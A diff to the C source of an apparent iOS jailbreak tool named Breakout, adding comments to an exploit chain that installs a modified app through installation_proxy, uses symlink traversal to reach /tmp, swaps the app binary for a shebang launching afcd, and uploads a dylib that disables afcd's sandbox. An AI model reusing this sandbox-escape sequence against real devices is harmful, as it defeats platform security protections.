@@ -380,6 +380,7 @@ int main(int argc, char *argv[]) {
 	
 	printf("%s [*] Successfully created new AFC client!%s\n\n", KGRN, KNRM);
 		
+	// just in case Breakout has been run before, we don't want any issues arising from old/new files.
 	printf(" [*] Performing sanity checks...\n");
 		
 	afcerr = afc_read_directory(gAfc, "/Downloads/WWDC.app", NULL);
@@ -414,6 +415,7 @@ int main(int argc, char *argv[]) {
 	
 	printf("%s [*] Successfully created Breakout-Install directory and pushed required files!%s\n\n", KGRN, KNRM);
 	
+	// we need this for installd to happily install our custom app :)
 	printf(" [*] Downloading code-signed app from Apple...\n");
 	// I don't have net ATM system("curl -b \"downloadKey=expires=1387947603~access=/us/r1000/098/Purple/v4/c3/4e/98/c34e989a-8522-fde0-db2d-884dd3b1302d/mzps6036043982514941651.D2.pd.ipa*~md5=dc91b9d5599eb2e135bddbec3ad5dbc2\" http://a396.phobos.apple.com/us/r1000/098/Purple/v4/c3/4e/98/c34e989a-8522-fde0-db2d-884dd3b1302d/mzps6036043982514941651.D2.pd.ipa -o resources/wwdc.ipa > /dev/null");
 	printf("%s [*] Successfully downloaded app!%s\n\n", KGRN, KNRM);
@@ -425,6 +427,7 @@ int main(int argc, char *argv[]) {
 	system("zip -r resources/breakout.ipa Payload/ META-INF/ > /dev/null");
 	system("rm -r Payload META-INF > /dev/null");
 		
+	// un-modified version of WWDC.app
 	printf(" [*] Attempting to upload original app to /Downloads...\n");
 
 	afcerr = afc_send_directory(gAfc, "resources/WWDC.app", "Downloads/WWDC.app");
@@ -433,6 +436,7 @@ int main(int argc, char *argv[]) {
 		return -1;
 	}
 	
+	// we don't need this anymore, clear it.
 	system("rm -rf resources/WWDC.app > /dev/null");
 		
 	printf("%s [*] Successfully uploaded app!%s\n\n", KGRN, KNRM);
@@ -445,10 +449,12 @@ int main(int argc, char *argv[]) {
 		return -1;
 	}
 	
+	// we don't need this anymore, clear it.
 	system("rm -rf resources/breakout.ipa > /dev/null");
 	
 	printf("%s [*] Successfully uploaded custom IPA!%s\n\n", KGRN, KNRM);
 	
+	// reconnect
 	printf(" [*] Attempting to connect to lockdownd...\n");
 	lderr = lockdownd_client_new_with_handshake(gDevice, &gLockdown,
 			"installclient");
@@ -459,6 +465,7 @@ int main(int argc, char *argv[]) {
 	
 	printf("%s [*] Successfully connected to lockdownd!%s\n\n", KGRN, KNRM);
 	
+	// com.apple.mobile.installation_proxy
 	printf(" [*] Attempting start installation proxy service...\n");
 	lderr = lockdownd_start_service(gLockdown, "com.apple.mobile.installation_proxy", &port);
 	if (lderr != LOCKDOWN_E_SUCCESS) {
@@ -468,7 +475,7 @@ int main(int argc, char *argv[]) {
 	}
 	
 	printf("%s [*] Successfully started installation proxy service!%s\n\n", KGRN, KNRM);
-	
+
 	printf(" [*] Attempting to connect to installation proxy service...\n");
 	instproxy_error_t ie = 0;
 	instproxy_client_t instproxy = NULL;
@@ -480,6 +487,7 @@ int main(int argc, char *argv[]) {
 	
 	printf("%s [*] Successfully connected to installation proxy service!%s\n\n", KGRN, KNRM);
 	
+	// installs our modified ipa for us, thanks installd
 	printf(" [*] Requesting installation proxy to install custom app...\n");
 	
 	plist_t opts = instproxy_client_options_new();
@@ -501,6 +509,7 @@ int main(int argc, char *argv[]) {
 	
 	printf("%s [*] Installation proxy successfully installed app!%s\n\n", KGRN, KNRM);
 		
+	// symlink to /tmp, count the ../../'s
 	printf(" [*] Attempting to get access to /tmp through symlink hacks...\n");
 	
 	afcerr = afc_make_directory(gAfc, "Downloads/a/a/a/a/a");
@@ -521,6 +530,7 @@ int main(int argc, char *argv[]) {
 		return -1;
 	}
 	
+	// check if we actually have access to /tmp
 	char **list = NULL;
 	afcerr = afc_read_directory(gAfc, "tmp/", &list);
 	if (list == NULL) {
@@ -530,6 +540,7 @@ int main(int argc, char *argv[]) {
 	
 	printf("%s [*] Successfully got access to /tmp!%s\n\n", KGRN, KNRM);	
 	
+	// replace Downloads/WWDC.app/WWDC with our shebang to launch afcd
 	printf(" [*] Attempting to replace original binary with shebang...\n");
 	
 	uint32_t bw = 0;
@@ -544,6 +555,7 @@ int main(int argc, char *argv[]) {
 		return -1;
 	}
 	
+	// upload gameover.dylib - when loaded, doesn't init sandbox for afcd
 	printf(" [*] Attempting to upload gameover.dylib...\n");
 	afcerr = afc_send_file(gAfc, "resources/gameover.dylib", "Downloads/WWDC.app/");
 	if (afcerr != AFC_E_SUCCESS) {
